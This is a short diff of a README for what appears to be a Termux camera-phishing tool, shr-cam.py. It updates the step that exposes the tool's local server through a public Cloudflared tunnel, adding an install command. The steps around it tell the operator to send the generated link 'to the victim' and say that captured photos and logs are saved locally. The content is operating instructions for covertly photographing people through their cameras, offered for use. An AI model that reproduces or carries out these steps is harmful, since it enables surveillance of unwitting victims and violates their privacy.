@@ -38,8 +38,8 @@ python shr-cam.py
 1. Run the tool using python shr-cam.py
 2. Select your desired camera mode (1, 2, or 3).
 3. Open a new session in Termux and start a tunnel (e.g., using Cloudflared):
-
-cloudflared tunnel --url [http://127.0.0.1:8080](http://127.0.0.1:8080)
+pkg install cloudflared -y 
+cloudflared tunnel --url http://127.0.0.1:8080
 
 4. Send the generated link to the victim.
 5. Captured photos and logs will appear in your terminal and be saved in sites/camera/.
